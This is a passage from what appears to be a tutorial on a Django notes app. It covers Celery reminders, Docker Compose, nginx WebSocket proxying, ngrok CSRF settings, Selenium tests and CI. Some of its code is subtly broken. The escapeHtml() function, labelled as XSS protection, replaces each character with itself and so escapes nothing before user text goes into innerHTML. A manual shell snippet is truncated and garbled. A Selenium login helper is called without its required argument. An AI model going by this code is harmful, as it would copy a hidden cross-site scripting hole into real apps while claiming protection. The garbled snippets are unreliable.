# the Channels channel layer (DB 0)
_CELERY_REDIS = _REDIS_URL.replace("/0", "/1") if _REDIS_URL else "redis://localhost:6379/1"

CELERY_BROKER_URL = _CELERY_REDIS
CELERY_RESULT_BACKEND = _CELERY_REDIS
CELERY_TIMEZONE = TIME_ZONE
CELERY_TASK_SERIALIZER = "json"
CELERY_RESULT_SERIALIZER = "json"
CELERY_ACCEPT_CONTENT = ["json"]

CELERY_BEAT_SCHEDULE = {
    "send-reminders-every-minute": {
        "task": "notes_app.tasks.send_reminder_notifications",
        "schedule": 60.0,   # every 60 seconds
    },
}

Why Redis DB 1?

In the project Redis is used twice:

Who uses it Redis DB Purpose Django Channels redis://redis:6379/0 channel layer (WebSocket) Celery redis://redis:6379/1 broker + result backend

If both use DB 0, Channels messages and Celery tasks may conflict. Different DBs isolate them.

CELERY_BEAT_SCHEDULE — defines the schedule without the external django-celery-beat package. Simpler for an educational project.

docs.title: Step 4 — Docker Compose: two new services
docs.text:
# docker-compose.yml
  celery-worker:
    build: .
    command: celery -A notes_project worker -l info --concurrency=2
    volumes:
      - .:/app
    environment:
      DATABASE_URL: postgres://notes_user:notes_pass@db:5432/notes_db
      REDIS_URL: redis://redis:6379/0
      DJANGO_SETTINGS_MODULE: notes_project.settings
    depends_on:
      db:
        condition: service_healthy
      redis:
        condition: service_healthy
    networks:
      - app-net

  celery-beat:
    build: .
    command: celery -A notes_project beat -l info
    volumes:
      - .:/app
    environment:
      DATABASE_URL: postgres://notes_user:notes_pass@db:5432/notes_db
      REDIS_URL: redis://redis:6379/0
      DJANGO_SETTINGS_MODULE: notes_project.settings
    depends_on:
      db:
        condition: service_healthy
      redis:
        condition: service_healthy
    networks:
      - app-net

Why are the Worker and Beat separate services?

Service Role Number of instances celery-worker runs the tasks 1+ (scale out) celery-beat puts tasks into the queue on a schedule exactly 1 (!)

Beat must run as a single instance — if you start two, tasks will land in the queue twice.

--concurrency=2 — the Worker starts 2 parallel processes to run tasks.

Checking after startup:

docker compose up -d

# Worker logs — you should see:
docker compose logs celery-worker
# celery@... ready.
# [tasks]
#   . notes_app.tasks.send_reminder_notifications

# Beat logs — you should see:
docker compose logs celery-beat
# beat: Starting...
# Scheduler: Sending due task send-reminders-every-minute (...)

docs.title: Step 5 — Browser notifications: fetch + Toast
docs.text: Celery sends the email in the background. But to show a reminder right in the browser, you need a separate mechanism.

docs.title: Why not WebSocket?
docs.text: WebSocket is ideal for a live two-way stream (chat). For reminders, HTTP polling is enough — a simpler mechanism without a persistent connection.

docs.title: JSON endpoint
docs.text:
# notes_app/selectors.py
def get_due_reminders_for_browser(user):
    from datetime import timedelta
    now = timezone.now()
    return list(
        Reminder.objects
        .filter(
            note__user=user,
            remind_at__lte=now,
            remind_at__gte=now - timedelta(hours=1),   # 1-hour window
        )
        .select_related('note')
        .order_by('remind_at')
        .values('id', 'message', 'remind_at', 'note__title')
    )

# notes_app/views.py
@login_required
def reminders_check(request):
    data = selectors.get_due_reminders_for_browser(request.user)
    for item in data:
        item['remind_at'] = item['remind_at'].strftime('%d.%m.%Y %H:%M')
    return JsonResponse({'reminders': data})

The 1-hour window (remind_at__gte=now - timedelta(hours=1)) — if the user opens the browser 30 minutes after the reminder, they will still see the Toast. Reminders older than 1 hour are no longer relevant.

docs.title: JavaScript polling
docs.text:
// notes_app/static/notes_app/js/reminders.js
(function () {
  'use strict';

  var POLL_INTERVAL = 60_000;           // 60 seconds
  var STORAGE_KEY   = 'shown_reminders'; // sessionStorage — deduplication
  var CHECK_URL     = '/reminders/check/';

  function getShownIds() {
    try {
      return new Set(JSON.parse(sessionStorage.getItem(STORAGE_KEY) || '[]'));
    } catch (_) { return new Set(); }
  }

  function markShown(id) {
    var s = getShownIds();
    s.add(id);
    sessionStorage.setItem(STORAGE_KEY, JSON.stringify(Array.from(s)));
  }

  function escapeHtml(str) {   // XSS protection — always escape user content
    return String(str)
      .replace(/&/g, '&').replace(/</g, '<')
      .replace(/>/g, '>').replace(/"/g, '"');
  }

  function showToast(reminder) {
    var container = document.getElementById('reminder-toast-container');
    if (!container) return;

    var toastEl = document.createElement('div');
    toastEl.className = 'toast align-items-center border-0';
    toastEl.innerHTML =
      '<div class="d-flex">'
      + '<div class="toast-body">'
      + '<strong>🔔 Нагадування</strong><br>'
      + '<span>' + escapeHtml(reminder.note__title) + '</span><br>'
      + (reminder.message ? '<small>' + escapeHtml(reminder.message) + '</small><br>' : '')
      + '<small class="text-muted">' + escapeHtml(reminder.remind_at) + '</small>'
      + '</div>'
      + '<button type="button" class="btn-close me-2 m-auto"'
      + ' data-bs-dismiss="toast" aria-label="Закрити"></button>'
      + '</div>';

    container.appendChild(toastEl);
    new bootstrap.Toast(toastEl, { delay: 8000, autohide: true }).show();
    toastEl.addEventListener('hidden.bs.toast', function () { toastEl.remove(); });
  }

  async function checkReminders() {
    try {
      var resp = await fetch(CHECK_URL, { credentials: 'same-origin' });
      if (!resp.ok) return;
      var data = await resp.json();
      var shown = getShownIds();
      (data.reminders || []).forEach(function (r) {
        if (!shown.has(r.id)) { showToast(r); markShown(r.id); }
      });
    } catch (_) { /* silent fail — the network is unavailable */ }
  }

  document.addEventListener('DOMContentLoaded', function () {
    if (!document.getElementById('reminder-toast-container')) return;
    checkReminders();                          // immediately on load
    setInterval(checkReminders, POLL_INTERVAL); // then every 60 seconds
  });
})();

Key decisions:

Decision Reason sessionStorage for deduplication A Toast won't appear twice in one session escapeHtml() for all user content XSS: an attacker could put a <script> into a note title checkReminders() immediately on DOMContentLoaded the test doesn't wait 60 seconds — the check happens on the first load IIFE (function () { ... })() module isolation — no global variables

</div>

docs.title: Step 6 — Tests for the worker and the view
Unit tests for the task
docs.text:
# notes_app/tests/test_tasks.py
from django.test import TestCase, override_settings
from django.contrib.auth.models import User
from django.utils import timezone
from datetime import timedelta
from django.core import mail

from notes_app.models import Note, Reminder
from notes_app.tasks import send_reminder_notifications


class SendReminderTaskTest(TestCase):
    def setUp(self):
        self.user = User.objects.create_user(
            'alice', email='alice@test.com', password='pass123'
        )
        self.note = Note.objects.create(
            user=self.user, title='Test Note', content=''
        )

    def _reminder(self, offset_minutes=-5, repeat='none', is_sent=False):
        return Reminder.objects.create(
            note=self.note,
            remind_at=timezone.now() + timedelta(minutes=offset_minutes),
            message='Тест',
            is_sent=is_sent,
            repeat_pattern=repeat,
        )

    @override_settings(EMAIL_BACKEND='django.core.mail.backends.locmem.EmailBackend')
    def test_marks_due_reminder_as_sent(self):
        r = self._reminder(offset_minutes=-5)
        send_reminder_notifications()
        r.refresh_from_db()
        self.assertTrue(r.is_sent)

    @override_settings(EMAIL_BACKEND='django.core.mail.backends.locmem.EmailBackend')
    def test_ignores_future_reminders(self):
        r = self._reminder(offset_minutes=+10)
        send_reminder_notifications()
        r.refresh_from_db()
        self.assertFalse(r.is_sent)

    @override_settings(EMAIL_BACKEND='django.core.mail.backends.locmem.EmailBackend')
    def test_sends_email_to_user(self):
        self._reminder(offset_minutes=-5)
        send_reminder_notifications()
        self.assertEqual(len(mail.outbox), 1)
        self.assertIn('alice@test.com', mail.outbox[0].to)

    @override_settings(EMAIL_BACKEND='django.core.mail.backends.locmem.EmailBackend')
    def test_daily_repeat_creates_next_reminder(self):
        r = self._reminder(offset_minutes=-5, repeat='daily')
        original_at = r.remind_at
        send_reminder_notifications()
        next_r = Reminder.objects.filter(note=self.note, is_sent=False).first()
        self.assertIsNotNone(next_r)
        diff = (next_r.remind_at - original_at).total_seconds()
        self.assertAlmostEqual(diff, 86400, delta=60)

@override_settings(EMAIL_BACKEND='...locmem...') — captures email into mail.outbox without a real SMTP server. The standard Django pattern for testing email.

mail.outbox — a list of EmailMessage objects. Each has .to, .subject, .body. It is reset automatically after each test.

docs.text:
class RemindersCheckViewTest(TestCase):
    def setUp(self):
        self.alice = User.objects.create_user('alice', password='pass123')
        self.bob = User.objects.create_user('bob', password='pass123')
        self.note = Note.objects.create(user=self.alice, title='Alice Note', content='')

    def test_requires_login(self):
        resp = self.client.get('/reminders/check/')
        self.assertEqual(resp.status_code, 302)

    def test_returns_due_reminders(self):
        self.client.force_login(self.alice)
        r = Reminder.objects.create(
            note=self.note,
            remind_at=timezone.now() - timedelta(minutes=30),
        )
        resp = self.client.get('/reminders/check/')
        self.assertEqual(resp.status_code, 200)
        data = resp.json()
        self.assertEqual(len(data['reminders']), 1)
        self.assertEqual(data['reminders'][0]['id'], r.id)

    def test_excludes_other_users_reminders(self):
        self.client.force_login(self.bob)
        Reminder.objects.create(
            note=self.note,
            remind_at=timezone.now() - timedelta(minutes=30),
        )
        resp = self.client.get('/reminders/check/')
        self.assertEqual(len(resp.json()['reminders']), 0)

docs.text:
# notes_app/tests/test_selenium.py (an additional class)
class SeleniumReminderToastTest(_DockerLiveServerMixin, StaticLiveServerTestCase):

    def setUp(self):
        self.user = User.objects.create_user(
            'rem_user', email='rem@test.com', password='pass123'
        )
        self.note = Note.objects.create(
            user=self.user, title='Selenium Reminder Note', content=''
        )

    def test_toast_appears_for_due_reminder(self):
        Reminder.objects.create(
            note=self.note,
            remind_at=timezone.now() - timedelta(minutes=30),
            message='JS toast test',
        )
        self._login_via_cookie()
        self.driver.get(f'{self.live_server_url}/notes/')

        # checkReminders() runs immediately on DOMContentLoaded — wait at most 10 sec
        toast = WebDriverWait(self.driver, 10).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, '.toast.show'))
        )
        self.assertIn('Selenium Reminder Note', toast.text)

Why doesn't the Selenium test wait 60 seconds?

reminders.js calls checkReminders() immediately on DOMContentLoaded — before the first interval cycle. The test only waits for the HTTP fetch (< 2 seconds).

Running:

# Unit tests (without Docker):
docker compose run --rm web python manage.py test notes_app.tests.test_tasks -v 2

# Selenium tests (the stack must be running):
docker compose up -d
docker compose exec web python manage.py test \
  notes_app.tests.test_selenium.SeleniumReminderToastTest -v 2

docs.text:
Task 1 — checking the worker:

docker compose up -d

# Look at the beat logs:
docker compose logs -f celery-beat

Task 2 — a manual test via the shell:

docker compose run --rm web python manage.py shell -c "
from django.utils import timezone
from datetime import timedelta
from notes_app.models import Note, Reminder
from django.contrib.auth.models import User

u = User.objects.filter(is_superuser=False).first()
n = Note.objects.filter(user=u).first()
r = Reminder.objects.create(
    note=n,

"

send_reminder_notifications()

"

# Check that is_sent=True
docker compose run --rm web python manage.py shell -c "
from notes_app.models import Reminder
print('Sent:', Reminder.objects.filter(is_sent=True).count())
"

Task 3 — browser toast:

  1. Run docker compose up -d and log in in the browser.
  2. Do task 2 (create a reminder in the past).
  3. Open /notes/ — the Toast should appear in the bottom-right corner within 3 seconds.
  4. Open DevTools → Network → find the /reminders/check/ request → check the JSON response.

Task 4 — understanding repeats:

# In the Django shell:
from dateutil.relativedelta import relativedelta
from datetime import datetime

# What does timedelta(days=30) return for December 31?
d = datetime(2024, 1, 31)
print(d + relativedelta(months=1))  # 2024-02-29 (correct)
print(d + __import__('datetime').timedelta(days=30))  # 2024-03-01 (wrong!)

Explain why relativedelta is the better choice for monthly repetition.

Task 5 — scaling (research):

What happens if you run two instances of celery-beat? How can you protect against duplicate tasks? Hint: look up celery beat --max-interval and django-celery-beat.

docs.title: Dockerfile — the Django image
docs.text:
# Dockerfile
FROM python:3.12-slim

WORKDIR /app

# ENV variables — set once for all subsequent layers
ENV PYTHONDONTWRITEBYTECODE=1 \
    PYTHONUNBUFFERED=1 \
    DJANGO_SETTINGS_MODULE=notes_project.settings \
    PYTHONPATH=/app

# First only requirements.txt — the layer is cached if the file has not changed
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Then all the code — this layer is rebuilt on every code change
COPY . .
RUN chmod +x entrypoint.sh

CMD ["./entrypoint.sh"]

docs.title: ENV variables explained
docs.text: ENV Why PYTHONDONTWRITEBYTECODE=1 Does not create .pyc files (reduces image size) PYTHONUNBUFFERED=1 Logs are printed immediately without buffering (visible in docker logs) DJANGO_SETTINGS_MODULE Django knows which settings.py to use PYTHONPATH=/app Python looks for modules in /app (not in subfolders)

docs.title: Why requirements.txt is copied BEFORE the code
docs.text:
Layer 1: FROM python:3.12-slim         ← cached (rarely changes)
Layer 2: COPY requirements.txt .       ← cached if requirements.txt has not changed
Layer 3: RUN pip install ...           ← cached together with layer 2
Layer 4: COPY . .                      ← ALWAYS rebuilt (code changes often)
Layer 5: CMD [...]                     ← lightweight

If you copy all the code BEFORE pip install:
  → on every code change → pip install again → long rebuild (~2-3 min)

With the split shown above:
  → on a code change → only COPY . . → fast (~10 sec)

docs.title: entrypoint.sh — the startup chain
docs.text:
#!/bin/sh
set -e   # stop on any error (any command returns non-0)

# 1. Apply new migrations
python manage.py migrate --noinput

# 2. Collect static files into /app/staticfiles/ (nginx takes them from there)
python manage.py collectstatic --noinput

# 3. Seed with demo data if requested
if [ "${SEED_DEMO_DATA}" = "1" ]; then
    python manage.py seed_demo_data --force
fi

# 4. Start the ASGI server
# exec = replaces the shell process with uvicorn
# WITHOUT exec: shell (PID 1) → uvicorn (PID 2)
#    SIGTERM → to shell → shell ignores it → uvicorn does not receive it → container does not stop
# WITH exec: uvicorn (PID 1) 
#    SIGTERM → to uvicorn → graceful shutdown → container stops correctly
exec python -m uvicorn notes_project.asgi:application \
    --host 0.0.0.0 \
    --port 8001 \
    --reload     # ← ONLY for dev! Remove in production

docs.title: The chain: set -e
docs.text:
set -e means:
  If migrate fails (for example, the DB is unavailable)
  → entrypoint.sh stops
  → collectstatic is not executed
  → uvicorn does not start
  → the container exits with an error code
  → Docker Compose marks web as failed
  → nginx does not start (depends_on: service_healthy)

Without set -e:
  → migrate fails, but entrypoint.sh continues
  → uvicorn starts without migrations
  → 500 errors on every page
  → hard to understand what went wrong

docs.title: exec vs no exec
docs.text:
# WITHOUT exec (bad):
python -m uvicorn ...
# Process tree:
#   PID 1: sh entrypoint.sh
#   PID 2: python uvicorn  ← SIGTERM does not reach it
#
# docker stop → SIGTERM → PID 1 (sh) → sh ignores it
#             → 10 sec → SIGKILL → hard kill

# WITH exec (correct):
exec python -m uvicorn ...
# Process tree:
#   PID 1: python uvicorn  ← SIGTERM arrives directly
#
# docker stop → SIGTERM → PID 1 (uvicorn) → graceful shutdown
#             → helps close active WebSocket connections

docs.title: Full docker-compose.yml
docs.text:
services:

  # ─── PostgreSQL ────────────────────────────────────────────────────
  db:
    image: postgres:16-alpine
    volumes:
      - postgres_data:/var/lib/postgresql/data  # persists across restarts
    environment:
      POSTGRES_DB:       ${POSTGRES_DB}
      POSTGRES_USER:     ${POSTGRES_USER}
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U ${POSTGRES_USER} -d ${POSTGRES_DB}"]
      interval: 5s
      retries: 5
    networks: [app-net]

  # ─── Redis ─────────────────────────────────────────────────────────
  redis:
    image: redis:7-alpine
    healthcheck:
      test: ["CMD", "redis-cli", "ping"]   # PONG = Redis is alive
      interval: 5s
    networks: [app-net]

  # ─── Web (Django) ──────────────────────────────────────────────────
  web:
    build: .
    ports:
      - "8001:8001"      # direct access for Selenium (tests do not go through nginx)
    environment:
      DATABASE_URL:  postgres://${POSTGRES_USER}:${POSTGRES_PASSWORD}@db:5432/${POSTGRES_DB}
      REDIS_URL:     redis://redis:6379/0
      SECRET_KEY:    ${SECRET_KEY}
      DEBUG:         ${DEBUG:-False}
      ALLOWED_HOSTS: ${ALLOWED_HOSTS:-localhost,127.0.0.1}
      NGROK_DOMAIN:  ${NGROK_DOMAIN}
      SEED_DEMO_DATA: ${SEED_DEMO_DATA:-0}
      WEB_HOST:      web         # Selenium uses this name to connect
      SELENIUM_REMOTE_URL: http://selenium:4444/wd/hub
    volumes:
      - staticfiles:/app/staticfiles   # web writes → nginx reads
    depends_on:
      db:    {condition: service_healthy}
      redis: {condition: service_healthy}
    healthcheck:
      test: >
        python -c "import urllib.request;
        urllib.request.urlopen('http://localhost:8001/accounts/login/')"
      interval: 5s
      retries: 12
      start_period: 15s   # first healthcheck after 15 sec (time for migrate)
    networks: [app-net]

  # ─── Nginx ─────────────────────────────────────────────────────────
  nginx:
    image: nginx:1.27-alpine
    ports: ["80:80"]
    volumes:
      - ./nginx/nginx.conf:/etc/nginx/nginx.conf:ro   # read-only
      - staticfiles:/staticfiles:ro                   # read-only
    depends_on:
      web: {condition: service_healthy}
    healthcheck:
      test: ["CMD-SHELL", "curl -sf http://localhost/accounts/login/ || exit 1"]
      interval: 10s
    networks: [app-net]

  # ─── Ngrok ─────────────────────────────────────────────────────────
  ngrok:
    image: ngrok/ngrok:latest
    command: http --url=${NGROK_DOMAIN} nginx:80
    environment:
      NGROK_AUTHTOKEN: ${NGROK_AUTHTOKEN}
    ports: ["4040:4040"]   # dashboard: http://localhost:4040
    depends_on:
      nginx: {condition: service_healthy}
    networks: [app-net]

  # ─── Selenium ──────────────────────────────────────────────────────
  selenium:
    image: selenium/standalone-chrome:latest
    ports:
      - "4444:4444"    # WebDriver API
      - "7900:7900"    # VNC (watch the browser live)
    shm_size: '2g'     # Chrome needs shared memory
    networks: [app-net]

# ─── Named volumes ───────────────────────────────────────────────────
volumes:
  postgres_data:    # PostgreSQL data (persists across docker compose down/up)
  staticfiles:      # Django collectstatic output → nginx

# ─── Named network ───────────────────────────────────────────────────
networks:
  app-net:
    driver: bridge
    # Explicit network: "nginx" → nginx IP, "redis" → redis IP
    # Without an explicit network ngrok may fail to find "nginx" → ERR_NGROK_8012

docs.title: The problem without health checks
docs.text:
WITHOUT health checks:
  docker compose up
  → db starts (but PostgreSQL is still initializing for ~3 sec)
  → web starts (depends_on: db — but only "started", not "healthy")
  → entrypoint.sh: migrate → ERROR: could not connect to server
  → uvicorn does not start
  → nginx does not start (but keeps trying)
  → ngrok cannot reach it → ERR_NGROK_8012

With health checks (condition: service_healthy):
  → db starts → pg_isready → HEALTHY (only then is web allowed to start)
  → web starts → migrate → uvicorn → healthcheck pass → HEALTHY
  → nginx starts → HEALTHY
  → ngrok starts (nginx is already ready)

docs.title: start_period — explained
docs.text:
web:
  healthcheck:
    interval: 5s
    retries: 12
    start_period: 15s

0s   → container started
0–15s → entrypoint.sh: migrate + collectstatic + seed_demo_data
       start_period: healthcheck is not counted as a failure during this time
15s  → real checks begin every 5s
75s  → if all 12 attempts (5s × 12 = 60s) failed → UNHEALTHY
       nginx does not start

Without start_period:
  → healthcheck starts immediately
  → migrate takes 8–10s → healthcheck fails
  → after 12 × 5s = 60s → UNHEALTHY
  → nginx tries to start on a broken web → 502

docs.title: Types of healthcheck tests
docs.text:
# PostgreSQL — pg_isready (official utility):
test: ["CMD-SHELL", "pg_isready -U myuser -d mydb"]

# Redis — redis-cli ping:
test: ["CMD", "redis-cli", "ping"]

# Web — HTTP request:
test: >
  python -c "import urllib.request;
  urllib.request.urlopen('http://localhost:8001/accounts/login/')"

# Nginx — curl HTTP:
test: ["CMD-SHELL", "curl -sf http://localhost/accounts/login/ || exit 1"]
# -s: silent (no progress bar), -f: fail on HTTP errors (4xx/5xx)

docs.title: PostgreSQL — from SQLite to a production DB
Connecting via DATABASE_URL
docs.text:
# notes_project/settings.py
import os
import re

_DATABASE_URL = os.environ.get('DATABASE_URL')
if not _DATABASE_URL:
    raise Exception("DATABASE_URL не встановлено. Запускай через docker compose.")

# Parse the URL manually — dj-database-url is not used in this project
_m = re.match(r'postgres://([^:]+):([^@]+)@([^:]+):(\d+)/(.+)', _DATABASE_URL)
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.postgresql',
        'NAME':     _m.group(5),
        'USER':     _m.group(1),
        'PASSWORD': _m.group(2),
        'HOST':     _m.group(3),   # ← Docker DNS: "db" → container IP
        'PORT':     _m.group(4),
        # CONN_MAX_AGE=0: disable persistent connections for async mode.
        # In async, one connection could serve several coroutines → race condition.
        'CONN_MAX_AGE': 0,
    }
}

Without DATABASE_URL — an Exception, not SQLite

settings.py does not have a SQLite fallback. If DATABASE_URL is not set, the app raises an Exception right at startup. Always run it through docker compose. More details → Troubleshooting

docs.title: Why PostgreSQL and not SQLite
docs.text: SQLite PostgreSQL File A single db.sqlite3 file Separate server Concurrent writes Locks the file while writing Real transactions, MVCC PostGIS — Geospatial types (GEOMETRY, GEOGRAPHY) JSON Limited support jsonb with indexes Production Not recommended Standard

docs.title: Redis — the channel layer in Docker
docs.text:
redis:
  image: redis:7-alpine
  healthcheck:
    test: ["CMD", "redis-cli", "ping"]
    interval: 5s
  networks: [app-net]

# settings.py
_REDIS_URL = os.environ.get('REDIS_URL')

if _REDIS_URL:
    CHANNEL_LAYERS = {
        "default": {
            "BACKEND": "channels_redis.core.RedisChannelLayer",
            "CONFIG": {
                "hosts": [{
                    "address": _REDIS_URL,           # redis://redis:6379/0
                    "socket_timeout": None,          # ← critical
                    "socket_connect_timeout": 5,
                    "health_check_interval": 30,
                }],
            },
        }
    }

Redis in Docker is redis://redis:6379/0: - redis — the DNS name of the service in the Docker network - 6379 — the standard Redis port - /0 — database index (Redis supports 16 databases, 0–15)

More on socket_timeout=None → 07 — Async

docs.title: nginx.conf — reverse proxy with WebSocket
docs.text:
# nginx/nginx.conf
worker_processes auto;  # automatic — based on the number of CPU cores

events {
    worker_connections 1024;  # max connections per worker
}

http {
    include /etc/nginx/mime.types;  # MIME types for static files

    # ─── WebSocket upgrade map ──────────────────────────────────────
    # Determines the value of the Connection header depending on Upgrade:
    #   Upgrade: websocket → Connection: upgrade
    #   (empty Upgrade) → Connection: close
    map $http_upgrade $connection_upgrade {
        default upgrade;
        ""      close;
    }

    # ─── Upstream (Django) ──────────────────────────────────────────
    upstream django {
        server web:8001;   # "web" — the DNS name of the service
    }

    server {
        listen 80;

        # ─── Static files ───────────────────────────────────────────
        # nginx serves static files directly, Django is not involved
        location /static/ {
            alias /staticfiles/;     # volume with collectstatic output
            expires 7d;
            add_header Cache-Control "public, immutable";
            # immutable: the browser does not check for updates for 7 days
        }

        # ─── Everything else (HTTP + WebSocket) → uvicorn ───────────
        location / {
            proxy_pass http://django;

            # Original headers from the browser → Django
            proxy_set_header Host              $host;
            proxy_set_header X-Real-IP         $remote_addr;
            proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;
            proxy_set_header X-Forwarded-Proto $scheme;

            # ─── WebSocket upgrade — REQUIRED ───────────────────────
            proxy_http_version 1.1;
            # ↑ The WebSocket Upgrade handshake requires HTTP/1.1
            #   Without this nginx uses HTTP/1.0 → Upgrade is ignored

            proxy_set_header Upgrade    $http_upgrade;
            proxy_set_header Connection $connection_upgrade;
            # ↑ These headers enable WebSocket at the nginx level

            # Timeout for long-lived connections
            proxy_read_timeout 300s;     # 5 minutes — for idle WS
            proxy_connect_timeout 75s;
        }
    }
}

docs.title: Without nginx vs with nginx (static files)
docs.text:
Without nginx:
  Browser → Django/Uvicorn → reads CSS/JS from disk → returns it
  A Python process is involved for every static file

With nginx:
  Browser → nginx → reads CSS/JS from disk directly → returns it
  Django/Uvicorn is not involved at all

Nginx serves static files 5-10x faster and frees Python workers
to handle real requests.

docs.title: Why WebSocket needs HTTP/1.1
docs.text:
HTTP/1.0: every request = a new connection
HTTP/1.1: keepalive — the connection stays open

WebSocket Upgrade handshake:
  GET /ws/groups/7/chat/ HTTP/1.1  ← 1.1 REQUIRED
  Upgrade: websocket
  Connection: Upgrade

If nginx proxies as HTTP/1.0:
  the Upgrade header is ignored
  → the handshake fails
  → the WS connection is not established
  → the browser receives 400 or 404

docs.title: CSRF_TRUSTED_ORIGINS — why you get 403 through ngrok
Symptom
docs.text:
Opened https://fawn-natural-mayfly.ngrok-free.app/accounts/login/
You enter your login and click "Увійти"
→ 403 Forbidden: CSRF verification failed. Request aborted.

docs.title: Cause
docs.text:
POST /accounts/login/ HTTP/1.1
Host: fawn-natural-mayfly.ngrok-free.app
Origin: https://fawn-natural-mayfly.ngrok-free.app
X-CSRFToken: abc123...

Django checks the Origin header:
  Is "https://fawn-natural-mayfly.ngrok-free.app" in CSRF_TRUSTED_ORIGINS?
  CSRF_TRUSTED_ORIGINS = []   ← empty → 403

docs.title: Solution
docs.text:
# notes_project/settings.py
import os

_ngrok_domain = os.environ.get('NGROK_DOMAIN', '')
CSRF_TRUSTED_ORIGINS = [f'https://{_ngrok_domain}'] if _ngrok_domain else []

# ALLOWED_HOSTS also needs to be configured:
_allowed = os.environ.get('ALLOWED_HOSTS', 'localhost,127.0.0.1')
ALLOWED_HOSTS = [h.strip() for h in _allowed.split(',')]
if _ngrok_domain:
    ALLOWED_HOSTS.append(_ngrok_domain)

# docker-compose.yml — pass NGROK_DOMAIN into the web container:
services:
  web:
    environment:
      NGROK_DOMAIN: ${NGROK_DOMAIN}   # ← from .env → settings.py

docs.text:
.env:
  NGROK_DOMAIN=fawn-natural-mayfly.ngrok-free.app

  web.environment.NGROK_DOMAIN: ${NGROK_DOMAIN}

settings.py:

  CSRF_TRUSTED_ORIGINS = ['https://fawn-natural-mayfly.ngrok-free.app']

Django:
  POST /login/ → Origin check → trusted → 200 OK

docs.title: staticfiles volume — how static files reach nginx
docs.text:
Step 1: entrypoint.sh
  python manage.py collectstatic --noinput
  → Collects all static files:
    - notes_app/static/notes_app/css/style.css
    - notes_app/static/notes_app/js/group_chat.js
    - django/contrib/admin/static/admin/...
    - crispy_forms/...
  → Copies them into /app/staticfiles/

Step 2: docker-compose.yml
  web:
    volumes:
      - staticfiles:/app/staticfiles   ← web WRITES here

  nginx:
    volumes:
      - staticfiles:/staticfiles:ro    ← nginx READS from here (read-only)

Step 3: nginx.conf
  location /static/ {
    alias /staticfiles/;   ← serves directly
  }

Result:
  GET /static/notes_app/css/style.css
  → nginx → /staticfiles/notes_app/css/style.css
  → the file is returned directly (Python is not involved)

docs.title: Why E2E tests run via exec, not run
docs.text:
# ❌ WRONG — docker compose run:
docker compose run --rm web python manage.py test notes_app.tests.test_selenium
# run creates a NEW container
# The new container does not have the DNS alias "web" in the network
# Selenium tries GET http://web:8001/... → Cannot resolve host

# ✅ CORRECT — docker compose exec:
docker compose up -d   # bring the stack up first
docker compose exec web python manage.py test notes_app.tests.test_selenium
# exec runs INSIDE the already running web container
# the web container is already registered in the Docker network with the alias "web"
# Selenium: GET http://web:8001/ → DNS resolution → web container IP

docs.title: _DockerLiveServerMixin
docs.text:
# notes_app/tests/test_selenium.py

class _DockerLiveServerMixin:
    """
    Selenium LiveServerTestCase mixin for Docker Compose.

    Problem: LiveServerTestCase binds to 127.0.0.1 by default
    In Docker: 127.0.0.1 is not reachable from other containers.

    Solution: bind to 0.0.0.0 (all interfaces).
    WEB_HOST: env variable → Selenium uses "web" (DNS name) to connect.
    """
    host = '0.0.0.0'

    @classmethod
    def _make_driver(cls):
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options

        options = Options()
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')

        selenium_url = os.environ.get('SELENIUM_REMOTE_URL', 'http://selenium:4444/wd/hub')
        return webdriver.Remote(
            command_executor=selenium_url,
            options=options,
        )

    def _login_via_cookie(self, user):
        """
        Fast login via the session cookie (without the form).
        Bypasses the login form → tests are faster.
        """
        from django.contrib.sessions.backends.db import SessionStore

        session = SessionStore()
        session[settings.AUTH_USER_SESSION_KEY] = user.pk
        session['_auth_user_backend'] = 'django.contrib.auth.backends.ModelBackend'
        session['_auth_user_hash'] = user.get_session_auth_hash()
        session.save()

        web_host = os.environ.get('WEB_HOST', 'web')
        self.driver.get(f'http://{web_host}:{self.server_thread.port}/')
        self.driver.add_cookie({
            'name': settings.SESSION_COOKIE_NAME,
            'value': session.session_key,
        })

docs.title: GitHub Actions CI/CD
docs.text:
# .github/workflows/ci.yml
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:

  # ─── Job 1: Unit + Integration + Consumer tests ──────────────────
  test:
    runs-on: ubuntu-latest

    services:
      db:
        image: postgres:16-alpine
        env:
          POSTGRES_DB: notes_db
          POSTGRES_USER: notes_user
          POSTGRES_PASSWORD: notes_password
        options: >-
          --health-cmd "pg_isready -U notes_user -d notes_db"
          --health-interval 5s
          --health-retries 5
        ports:
          - 5432:5432

      redis:
        image: redis:7-alpine
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 5s
        ports:
          - 6379:6379

    env:
      DATABASE_URL: postgres://notes_user:notes_password@localhost:5432/notes_db
      REDIS_URL: redis://localhost:6379/0
      SECRET_KEY: ci-test-secret-key-not-for-production
      DEBUG: "True"
      ALLOWED_HOSTS: "localhost,127.0.0.1"

    steps:
      - uses: actions/checkout@v4

      - uses: actions/setup-python@v5
        with:
          python-version: '3.12'

      - name: Install dependencies
        run: pip install -r requirements.txt

      - name: Run migrations
        run: python manage.py migrate --noinput

      - name: Run tests
        run: |
          python manage.py test \
            notes_app.tests.test_models \
            notes_app.tests.test_services \
            notes_app.tests.test_forms \
            notes_app.tests.test_views \
            notes_app.tests.test_consumers \
            -v 2

  # ─── Job 2: Selenium E2E tests ───────────────────────────────────
  selenium-e2e:
    runs-on: ubuntu-latest
    needs: test   # runs only after the test job succeeds

    steps:
      - uses: actions/checkout@v4

      - name: Start stack
        run: |
          cp .env.example .env
          echo "SECRET_KEY=ci-secret" >> .env
          echo "SEED_DEMO_DATA=1" >> .env
          docker compose up -d --build
          docker compose ps

      - name: Wait for web to be healthy
        run: |
          timeout 120 bash -c \
            'until docker compose exec web python -c \
              "import urllib.request; urllib.request.urlopen(\"http://localhost:8001/accounts/login/\")" \
            2>/dev/null; do sleep 3; done'

      - name: Run Selenium tests
        run: docker compose exec web python manage.py test notes_app.tests.test_selenium -v 2

      - name: Upload failure screenshots
        if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: selenium-screenshots
          path: /tmp/selenium-screenshots/
          retention-days: 3

      - name: Cleanup
        if: always()
